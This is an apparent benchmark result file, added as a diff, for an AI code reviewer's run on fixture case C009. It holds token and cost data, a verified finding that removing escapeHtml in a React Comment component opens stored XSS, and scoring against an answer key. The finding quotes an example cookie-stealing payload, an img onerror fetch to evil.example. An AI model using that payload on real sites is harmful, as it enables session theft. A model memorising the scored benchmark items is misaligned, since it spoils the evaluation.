@@ -1,0 +1,95 @@
+{
+  "case": "C009",
+  "pr": "C009",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.6",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "7695481624f1",
+  "turns": 5,
+  "tool_calls": null,
+  "seconds": 49.9,
+  "setup_seconds": 0.0,
+  "total_seconds": 49.9,
+  "usage": {
+    "in": 30858,
+    "cache_read": 117120,
+    "cache_write": 0,
+    "out": 2040,
+    "source": "cli"
+  },
+  "cost_usd": 0.132516,
+  "changed_files": [
+    "src/components/Comment.tsx"
+  ],
+  "findings": [
+    {
+      "path": "src/components/Comment.tsx",
+      "line": 5,
+      "severity": "critical",
+      "body": "Passing unsanitized `body` into `dangerouslySetInnerHTML` is stored XSS. Any comment whose body includes HTML (for example `<img src=x onerror=\"fetch('https://evil.example/?c='+document.cookie)\">` or `<a href=\"javascript:\u2026\">`) runs in the viewer's origin as soon as the comment renders.\n\nThe previous `escapeHtml` path blocked this; deleting it without a sanitizer (DOMPurify, a markdown renderer with an HTML allowlist, or equivalent) reopens the injection. Restore escaping, or parse a restricted subset (bold/links) and write the result through a sanitizer before this assignment."
+    }
+  ],
+  "summary": "Unescaped user comment HTML is injected into the DOM, which is a stored XSS on every viewer of a comment.\n\n`Comment` previously ran `escapeHtml` before `dangerouslySetInnerHTML`, so comment text could not introduce tags or event handlers. This PR deletes that escape and passes `body` through as HTML. A comment containing `<img src=x onerror=\u2026>` or similar markup executes in the viewer's origin. There is no sanitizer, markdown renderer, or other caller that constrains `body` \u2014 this file is the entire render path.\n\nThe community-thread request for bold/links needs a sanitizing markdown (or HTML) pipeline, not raw injection. I would not merge this as written.\n\n**Recommendation:** request-changes",
+  "round": "full",
+  "effective_max_turns": 40,
+  "budget": {
+    "tier": "critical",
+    "profile": "auto",
+    "turns": 40,
+    "alias": "deep",
+    "model": "grok-4.6",
+    "output_tokens": 8192,
+    "verifier_warning_pct": 100,
+    "patch_bytes": 200000,
+    "native_cap_applied": true
+  },
+  "prior_finding_updates": {},
+  "prior_findings_kept": [],
+  "outstanding_verdicts": [],
+  "verification": [
+    {
+      "path": "src/components/Comment.tsx",
+      "line": 5,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The patch removes escapeHtml and assigns unsanitized body to dangerouslySetInnerHTML, which is stored XSS in the viewer origin. No sanitizer or alternative escaping remains in the component."
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 7.491,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 0,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 769,
+      "out": 297
+    },
+    "cost_usd": 0.004037
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C009-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 0,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
